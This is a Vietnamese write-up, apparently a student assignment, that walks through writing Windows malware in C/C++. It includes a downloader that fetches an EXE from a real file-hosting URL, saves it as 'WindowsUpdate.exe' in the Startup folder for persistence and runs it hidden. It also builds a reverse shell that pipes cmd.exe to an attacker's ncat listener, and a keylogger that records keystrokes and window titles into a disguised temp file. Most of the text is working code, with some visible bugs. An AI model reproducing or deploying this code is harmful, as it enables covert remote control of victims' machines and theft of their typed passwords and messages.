**Đề bài: ** Lập trình Malware, dùng C/C++ lập trình thực hiện các tính năng: downloader, dropper, persistence, reverse shell, keylogger

**Ý tưởng:**

- Sử dụng 2 file exe, file thứ nhất thực hiện tải từ trên mạng và lưu một file EXE vào thư mục `shell:startup` của người dùng rồi chạy file đó
- File thứ 2 khi được chạy sẽ tạo một reverse shell, sau khi tạo thành công hoặc không thành công thì sẽ bắt đầu lưu lại những thông tin mà người dùng đã nhập vào bàn phím rồi lưu lại vào một file TXT trong thư mục temp của người dùng

## 1. Downloader, dropper, persistence

- [SHGetKnownFolderPath()](https://learn.microsoft.com/en-us/windows/win32/api/shlobj_core/nf-shlobj_core-shgetknownfolderpath) để lấy đường dẫn đến thư mục `shell::startup` của người dùng

```c++
wchar_t* ppszPath;    
/*
HRESULT SHGetKnownFolderPath(
  [in]           REFKNOWNFOLDERID rfid,
  [in]           DWORD            dwFlags,
  [in, optional] HANDLE           hToken,
  [out]          PWSTR            *ppszPath
);
*/
// Get the current user shell:starup folder
HRESULT getStartUpResult = SHGetKnownFolderPath(
    FOLDERID_Startup,
    0,
    0,
    &ppszPath
);
```

Ở đây cần để ý 2 tham số là `rfid` ([KNOWNFOLDERID](https://learn.microsoft.com/en-us/windows/win32/shell/knownfolderid)) và `*ppszPath` (Kết quả được lưu vào đây). Đối với `KNOWNFOLDERID` thì ta sẽ dùng giá trị `FOLDERID_Startup` sẽ trả về cho ta đường dẫn: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\StartUp`

- Sau đó ta cần thêm tên file vào sau kết quả vừa được trả về

```c++
wchar_t fullPath[MAX_PATH];
wcscpy_s(fullPath, ppszPath);
wcscat_s(fullPath, L"\\WindowsUpdate.exe");
```

- Gọi hàm [URLDownloadToFileW](https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)) để tải và lưu file từ trên mạng

```c++
const wchar_t* szURL = L"https://files.catbox.moe/mcju6j.txt";    
// Get the current user shell:starup folder
HRESULT downloadResult = URLDownloadToFileW(
    0,
    szURL,
    fullPath,
    0,
    0
);
```

- Gọi [CreateProcessW](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) để chạy file

```c++
/*
BOOL CreateProcessW(
  [in, optional]      LPCWSTR               lpApplicationName,
  [in, out, optional] LPWSTR                lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCWSTR               lpCurrentDirectory,
  [in]                LPSTARTUPINFOW        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
*/
STARTUPINFO info = { sizeof(info) };
PROCESS_INFORMATION processInfo;
BOOL createProcessResult = CreateProcessW(
    fullPath,
    0,
    0,
    0,
    FALSE,
    CREATE_NO_WINDOW,
0,
    0,
    &info,
    &processInfo
);
```

`dwCreationFlags == CREATE_NO_WINDOW` để không tạo cửa sổ mới khi chạy malware

 [STARTUPINFO](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow) là struct dùng để chỉ định loại window station, desktop, handles, của chương trình khi chạy

[PROCESS_INFORMATION](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information) chứa các thông tin của process vừa được tạo và thread của nó

Do ta chỉ cần thực thi file `WindowsUpdate.exe` cho nên 2 struct trên không cần điền gì ngoài trường `cb` (Độ lớn của `STARTUPINFO`), sau khi `CreateProcessW` được gọi thì nó sẽ tự điền chúng

## 2. Reverse shell

Trước hết trên máy của attacker sẽ phải listen trước, vì đây chỉ là 1 function reverse shell đơn giản cho nên em sẽ chỉ dùng ncat để listen 

```
ncat.exe -lnvp 7676
```

Để khởi tạo kết nối đến server thì trên Windows ta có thể sử dụng [Winsock](https://learn.microsoft.com/en-us/windows/win32/winsock/getting-started-with-winsock):

- `WSAStartup` để sử dụng winsock DLL

```c++
WSADATA wsaData;
//Initiates use of winsock dll
int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
if (iResult != 0) {
    printf("WSAStartup fail");
    return 1;
}
```

- `getaddrinfo` để lưu lại IP và PORT của server, các tùy chỉnh cho socket như loại IP, giao thức, loại socket

```C++
/*
INT WSAAPI getaddrinfo(
  [in, optional] PCSTR           pNodeName,
  [in, optional] PCSTR           pServiceName,
  [in, optional] const ADDRINFOA *pHints,
  [out]          PADDRINFOA      *ppResult
);
*/
//Create a socket for the client
addrinfo hints;
addrinfo* results = NULL; //Pointer to linked list of addrinfo structs
memset(&hints, 0, sizeof(hints));
hints.ai_family = AF_INET; //Use only ipv4
hints.ai_socktype = SOCK_STREAM; //TCP
hints.ai_protocol = IPPROTO_TCP;
iResult = getaddrinfo(serverAddress, serverPort, &hints, &results);
```

Nếu `getaddrinfo` được gọi thành công thì các thông tin về IP và PORT của server sẽ được lưu vào một linked list các struct [ADDRINFO](https://learn.microsoft.com/en-us/windows/win32/api/ws2def/ns-ws2def-addrinfoa) (Ở đây lấy 1 IP, PORT nên chỉ có 1 struct)

- [WSASocketW()](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketw) để khởi tạo socket 

```c++
SOCKET connectSocket = INVALID_SOCKET;
addrinfo* ptr = results; // pointer to the first addrinfo struct
connectSocket = WSASocketW(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, 0, 0, 0);
if (connectSocket == INVALID_SOCKET) {
    printf("Failed to create socket");
    freeaddrinfo(results);
    WSACleanup();
    return 1;
}
```

- Nếu khởi tạo thành công thì ta sẽ kết nối đến server bằng `connect()`

```c++
//Connect to the server
iResult = connect(connectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
if (iResult == SOCKET_ERROR) {
    printf("Cant connect to %s:%s", serverAddress, serverPort);
    closesocket(connectSocket);
    freeaddrinfo(results);
    WSACleanup();
    return 1;
}
```

### Tạo reverse shell

Bây giờ thì cần phải tạo một process của `cmd.exe` sau đó thì cần cho process đó nhận input của attacker trên máy listen và gửi output cho attacker 

Để làm được điều này có thể dùng các trường `dwFlags, hStdInput, hStdOutput, hStdError` của struct `STARTUPINFO` được dùng trong hàm `CreateProcessW`

Theo như tài liệu trên [MSDN](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow) thì `dwFlags` nếu có giá trị của `STARTF_USESTDHANDLES` (Nếu `bInheritHandles` là TRUE) thì các thành phần của `hStdInput, hStdOutput, hStdError` sẽ là "standard input handle for the process". Vậy nếu ta đặt giá trị của `hStdInput, hStdOutput, hStdError` là handle của Socket vừa được khởi tạo thì input, output, error của `cmd.exe` cũng sẽ được truyền qua socket và gửi đến máy attacker

Để lấy handle của socket ta có thể cast giá trị SOCKET vừa được khởi tạo thành HANDLE

```c++
STARTUPINFO startupInfo = { sizeof(startupInfo) };
PROCESS_INFORMATION processInfo;
HANDLE hSocket = (HANDLE)connectSocket; //Cast SOCKET value to HANDLE type
startupInfo.dwFlags = STARTF_USESTDHANDLES; //CreateProcess will use provided handle
startupInfo.hStdError = startupInfo.hStdInput = startupInfo.hStdOutput = hSocket; //Pipe the in, out, error to the socket
iResult = CreateProcessW(
    0,
    shellCmd,
    0,
    0,
    TRUE, // Allow handle inheritance
    CREATE_NO_WINDOW,
    0,
    0,
    &startupInfo,
    &processInfo
);
if (iResult == 0) {
    send(connectSocket, "Cant create shell", 18, MSG_OOB);
    closesocket(connectSocket);
    freeaddrinfo(results);
    WSACleanup();
    return 1;
}
```

### 3. Keylogger

> Hiện tại mới chỉ xử lý được nếu bàn phím sử dụng layout US

Để có thể log lại được người dùng đã nhập những gì, ta cần biết cách Windows xử lý các input bàn phím như thế nào. Em đã tham khảo trang [Virtual-Key Codes](https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes) trên MSDN

Qua tìm hiểu trên mạng thì cách phổ biến nhất để lấy được các giá trị trên là thông qua các API [GetAsyncKeyState()](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate), [SetWindowsHookEx()](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa), [GetKeyState()](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeystate). Các loại mã độc có sử dụng keylogger cũng thường sử dụng các API này

Em đã sử dụng `GetAsyncKeyState()` để code phần keylogger. Dựa vào tài liệu của các giá trị Virtual-Key Codes, thấy rằng có từ 1->0xFE, sử dụng 1 vòng for trong 1 vòng lặp vô tận để `GetAsyncKeyState()` từng key code một, nếu key code đó được nhấn thì in giá trị của nó ra

`GetAsyncKeyState()` trả về một giá trị 2 byte (16bit), nếu key đó đang được nhấn thì most significant bit sẽ là 1, do MSB là sign bit cho nên nếu key được nhấn thì giá trị trả về sẽ là âm

Vậy để xác định key có được nhấn hay không ta sẽ kiểm tra `GetAsyncKeyState() < 0`

```c++
SHORT GetAsyncKeyState(
  [in] int vKey
);
```

```c++
while (true) {
    for (int i = 1; i <= 0xFE; i++) {
        if(GetAsyncKeyState(i) < 0) 
            printf("%x ", i);
    }
}
```

Đoạn code này log lại vẫn chưa chính xác cho lắm do vòng lặp vô hạn nên nếu chỉ nhấn nhẹ sẽ vẫn log ra nhiều lần 1 ký tự (Với những phím như `VK_SHIFT` thì khi người dùng giữ để viết hoa sẽ log rất nhiều lần) cho nên ta sẽ phải thêm phần kiểm tra xem key đang được nhấn giữ hay không và khi nào thì được thả ra

- Để làm vậy ta có thể thêm một biến bool để kiểm tra trạng thái xem key có đang được giữ không (TRUE là có, FALSE là không). Coi như vào thời điểm setup keylogger tất cả các key đều chưa được nhấn. Nếu đã được nhấn và đang giữ => Log key được nhấn; nếu không được nhấn và đang giữ => Log key được thả; nếu không được nhấn và không giữ => Không log

```c++
bool isDown = FALSE;
bool keyState[256] = {FALSE};
while (true) {
    for (int i = 1; i <= 0xFE; i++) {
        isDown = (GetAsyncKeyState(i)<0);
        if(isDown && !keyState[i]) 
            printf("[%x-PRESSED]", i);
        else if (!isDown && keyState)
            printf("[%x-RELEASED]", i);
    }
}
```

Bây giờ ta sẽ cần map các Virtual-Key Codes kia thành string để in ra. Để làm vậy sẽ tạo thêm một hàm nữa `GetKeyName(int vk)` rồi map từng code một thành string tương ứng

Em tạo thêm 1 file `keymappings.h`

```c++
static const char* GetKeyName(int vk)
{
    static char singleChar[2];

    // Letters
    if (vk >= 0x41 && vk <= 0x5A) {
        singleChar[0] = (char)(vk+0x20);
        singleChar[1] = '\0';
        return singleChar;
    }
        

    // Numbers
    if (vk >= 0x30 && vk <= 0x39) {
        singleChar[0] = (char)vk;
        singleChar[1] = '\0';
        return singleChar;
    }
        

    // Others
    switch (vk)
    {
    case VK_LBUTTON: return "[VK_LBUTTON]";
    case VK_RBUTTON: return "[VK_RBUTTON]";
    case VK_MBUTTON: return "[VK_MBUTTON]";
    case VK_BACK: return "[VK_BACK]";
    case VK_TAB: return "[VK_TAB]";
    case VK_RETURN: return "[ENTER]\n";
    case VK_SHIFT: return "[VK_SHIFT]";
    case VK_CONTROL: return "[VK_CONTROL]";
    case VK_MENU: return "[VK_ALT]";
    case VK_PAUSE: return "[VK_PAUSE]";
    case VK_CAPITAL: return "[VK_CAPSLOCK]";
    case VK_ESCAPE: return "[VK_ESCAPE]";
    case VK_SPACE: return " ";
    case VK_PRIOR: return "[VK_PAGEUP]";
    case VK_NEXT: return "[VK_PAGEDOWN]";
    case VK_END: return "[VK_END]";
    case VK_HOME: return "[VK_HOME]";
    case VK_LEFT: return "[VK_LEFT]";
    case VK_UP: return "[VK_UP]";
    case VK_RIGHT: return "[VK_RIGHT]";
    case VK_DOWN: return "[VK_DOWN]";
    case VK_INSERT: return "[VK_INSERT]";
    case VK_DELETE: return "[VK_DELETE]";
    case VK_LWIN: return "[VK_LWIN]";
    case VK_RWIN: return "[VK_RWIN]";
    case VK_NUMPAD0: return "[VK_NUMPAD0]";
    case VK_NUMPAD1: return "[VK_NUMPAD1]";
    case VK_NUMPAD2: return "[VK_NUMPAD2]";
    case VK_NUMPAD3: return "[VK_NUMPAD3]";
    case VK_NUMPAD4: return "[VK_NUMPAD4]";
    case VK_NUMPAD5: return "[VK_NUMPAD5]";
    case VK_NUMPAD6: return "[VK_NUMPAD6]";
    case VK_NUMPAD7: return "[VK_NUMPAD7]";
    case VK_NUMPAD8: return "[VK_NUMPAD8]";
    case VK_NUMPAD9: return "[VK_NUMPAD9]";
    case VK_MULTIPLY: return "[VK_MULTIPLY]";
    case VK_ADD: return "[VK_ADD]";
    case VK_SEPARATOR: return "[VK_SEPARATOR]";
    case VK_SUBTRACT: return "[VK_SUBTRACT]";
    case VK_DECIMAL: return "[VK_DECIMAL]";
    case VK_DIVIDE: return "[VK_DIVIDE]";
    case VK_F1: return "[F1]";
    case VK_F2: return "[F2]";
    case VK_F3: return "[F3]";
    case VK_F4: return "[F4]";
    case VK_F5: return "[F5]";
    case VK_F6: return "[F6]";
    case VK_F7: return "[F7]";
    case VK_F8: return "[F8]";
    case VK_F9: return "[F9]";
    case VK_F10: return "[F10]";
    case VK_F11: return "[F11]";
    case VK_F12: return "[F12]";
    case VK_NUMLOCK: return "[VK_NUMLOCK]";
    case VK_SCROLL: return "[VK_SCROLLLOCK]";
    case VK_LSHIFT: return "[VK_LSHIFT]";
    case VK_RSHIFT: return "[VK_RSHIFT]";
    case VK_LCONTROL: return "[VK_LCONTROL]";
    case VK_RCONTROL: return "[VK_RCONTROL]";
    case VK_LMENU: return "[VK_LALT]";
    case VK_RMENU: return "[VK_RALT]";
    case VK_VOLUME_UP: return "[VK_VOLUME_UP]";
    case VK_VOLUME_DOWN: return "[VK_VOLUME_DOWN]";
    case VK_VOLUME_MUTE: return "[VK_VOLUME_MUTE]";
    case VK_MEDIA_PLAY_PAUSE: return "[VK_MEDIA_PLAY_PAUSE]";
    case VK_MEDIA_NEXT_TRACK: return "[VK_MEDIA_NEXT_TRACK]";
    case VK_MEDIA_PREV_TRACK: return "[VK_MEDIA_PREV_TRACK]";
    case VK_SNAPSHOT: return "[VK_PRINTSCREEN]";
    case VK_OEM_1: return ";";
    case VK_OEM_PLUS: return "=";
    case VK_OEM_COMMA: return ",";
    case VK_OEM_MINUS: return "-";
    case VK_OEM_PERIOD: return ".";
    case VK_OEM_2: return "/";
    case VK_OEM_3: return "`";
    case VK_OEM_4: return "[";
    case VK_OEM_5: return "\\";
    case VK_OEM_6: return "]";
    case VK_OEM_7: return "'";
    case VK_OEM_8: return "[VK_RCONTOL]";
    case VK_OEM_102: "\\";
    case VK_OEM_CLEAR: "[VK_CLEAR]";
    default: return "[UNKNOWN_KEY]";
    }
}
```

```c++
bool isDown = FALSE;
bool keyState[256] = {FALSE};
while (true) {
    for (int i = 1; i <= 0xFE; i++) {
        bool isDown = (GetAsyncKeyState(i)<0);
        if(isDown && !keyState[i]) 
            printf("[%s]", GetKeyName(i));
        else if (!isDown && keyState)
            printf("[%s-RELEASED]", GetKeyName(i));
    }
}
```

Bây giờ chỉ cần thêm tạo file vào thư mục và ghi vào file thay cho `printf`

```c++
bool isDown = FALSE;
bool keyState[256] = {FALSE};
// Create file in temp folder
int iResult = GetTempPathA(MAX_PATH, tempPath);
if (iResult == 0) {
    printf("Cant get temp path");
    return 1;
}
strcpy_s(keyLogPath, tempPath);
strcat_s(keyLogPath, "\\UpdatesLogs.txt");
FILE* fPtr;
iResult = fopen_s(&fPtr, keyLogPath, "a");
if (iResult != 0) {
    printf("Failed to create file");
    return 1;
}
// Keylogger
while (true) {
    for (int i = 1; i <= 0xFE; i++) {
        bool isDown = (GetAsyncKeyState(i)<0);
        if(isDown && !keyState[i]) 
            fprintf(fPtr, "[%s]", GetKeyName(i));
        	fflush(fPtr);
        else if (!isDown && keyState)
            fprintf(fPtr, "[%s-RELEASED]", GetKeyName(i));
        	fflush(fPtr);
    }
}
```

Để log chi tiết thêm thì ta có thể lưu thêm thời gian và tên cửa sổ người dùng đang sử dụng

- Đối với thời gian em dùng `GetLocalTime()` để lấy thời gian theo múi giờ của người dùng hoặc `GetSystemTime()` để lấy giờ UTC+0. Tại mỗi vòng lặp nếu key được nhấn thì sẽ kiểm tra thời gian vừa lấy với thời gian hiện tại (Vòng lặp đầu thì thời gian hiện tại sẽ là 0), nếu khác nhau thì mới lưu vào file
- Đối với tên cửa sổ hiện tại của người dùng `GetForeGroundWindow()` để lấy cửa sổ người dùng đang sử dụng, `GetWindowTextW()` để lấy tên của cửa sổ đó. Sau đó so sánh tên vừa lấy được và tên hiện tại, nếu khác nhau thì lưu vào file

Đối với các phím trái phải của SHIFT, CTRL và ALT thì khi nhấn vào phím LSHIFT thì windows sẽ nhận cả `VK_SHIFT` và `VK_LSHIFT`. Cho nên ta có thể bỏ qua không log các keycode sau để log gọn hơn: `VK_SHIFT, VK_CONTOL, VK_MENU`

Để log gọn hơn nữa thì ta có thể tạo một hàm `GetKeyType()` để xem key code đó có phải là chữ số, hoặc các phím `+-*/` .... Để bỏ qua không log lại phần RELEASED

```c++
#define OTHERS_TYPE 1
#define IGNORE 0
static int getKeyType(int vk) {
    // Characters
    if (vk >= 0x41 && vk <= 0x5A) return IGNORE;

    // Numbers
    if (vk >= 0x30 && vk <= 0x39) return IGNORE;

    if (vk == VK_RETURN || vk == VK_OEM_1 || vk == VK_OEM_PLUS ||
        vk == VK_OEM_COMMA || vk == VK_OEM_MINUS || vk == VK_OEM_PERIOD ||
        vk == VK_OEM_2 || vk == VK_OEM_3 || vk == VK_OEM_4 ||
        vk == VK_OEM_5 || vk == VK_OEM_6 || vk == VK_OEM_7 ||
        vk == VK_OEM_8 || vk == VK_OEM_102 || vk == VK_SPACE) return IGNORE;

    return OTHERS_TYPE; 
}
```

Áp dụng vào phần keylogger  

```c++
int keyLogger() {
    int currentValue = 0;
    HWND prevhWnd = NULL;
    wchar_t windowTitle[256];
    wchar_t currentTitle[256] = { NULL };
    char tempPath[MAX_PATH];
    char keyLogPath[MAX_PATH];
    SYSTEMTIME currentTime = { NULL };

    // Create file in temp folder
    int iResult = GetTempPathA(MAX_PATH, tempPath);
    if (iResult == 0) {
        printf("Cant get temp path");
        return 1;
    }
    strcpy_s(keyLogPath, tempPath);
    strcat_s(keyLogPath, "\\UpdatesLogs.txt");
    FILE* fPtr;
    iResult = fopen_s(&fPtr, keyLogPath, "a");
    if (iResult != 0) {
        printf("Failed to create file");
        return 1;
    }

    // Keylogger imple
    bool isDown = FALSE;
    bool keyState[256] = { FALSE }; //To track if key is down or up
    while (true) {
        for (int i = 0x1; i <= 0xFE; i++) {
            // Because VK_RSHIFT, VK_LSHIFT both registered as VK_SHIFT so we skip these for better output
            if (i == VK_SHIFT || i == VK_CONTROL || i == VK_MENU) {
                continue;
            }
            isDown = (GetAsyncKeyState(i) < 0);
            // If keyState is FALSE (UP) and key just got pressed => write key. Else if keyState is TRUE (DOWN) but key is not pressed, dont write
            if (isDown && !keyState[i]) {
                // Print current date, only print another line if date is different
                SYSTEMTIME lt;
                GetLocalTime(&lt);
                if (lt.wYear != currentTime.wYear ||
                    lt.wMonth != currentTime.wMonth ||
                    lt.wDay != currentTime.wDay) {
                    currentTime.wYear = lt.wYear;
                    currentTime.wMonth = lt.wMonth;
                    currentTime.wDay = lt.wDay;
                    fprintf(fPtr, "\n****************************************[CURRENT DATE: %04d-%02d-%02d]*****************************************\n", 
                            lt.wYear, lt.wMonth, lt.wDay);
                    fflush(fPtr);
                }
                keyState[i] = TRUE;
                HWND currenthWnd = GetForegroundWindow();
                prevhWnd = currenthWnd;
                int textLen = GetWindowTextW(currenthWnd, windowTitle, 256);
                // Check if the title is different
                if (textLen > 0 && (wcscmp(currentTitle, windowTitle) != 0)) {
                    wcscpy_s(currentTitle, windowTitle);
                    char utf8Title[1024];
                    utf8_encode(utf8Title, currentTitle, sizeof(utf8Title));
                    //printf("\n==========[%s]==========\n", utf8Title);
                    fprintf(fPtr, "\n==============================[%s]==============================\n", utf8Title);
                }
                //printf("%s", GetKeyName(i));
                fprintf(fPtr, "%s", GetKeyName(i));
                fflush(fPtr);
            }
            // If key is not pressed but keyState is TRUE (DOWN) write key released 
            else if (!isDown && keyState[i]) {
                keyState[i] = FALSE;
                // For these buttons check if they are released
                if (getKeyType(i) == OTHERS_TYPE) {
                    //printf("[%s Released]", GetKeyName(i));
                    fprintf(fPtr, "[%s-RELEASED]", GetKeyName(i));
                    fflush(fPtr);
                }
            }
        }
        Sleep(20);
    }
}
```

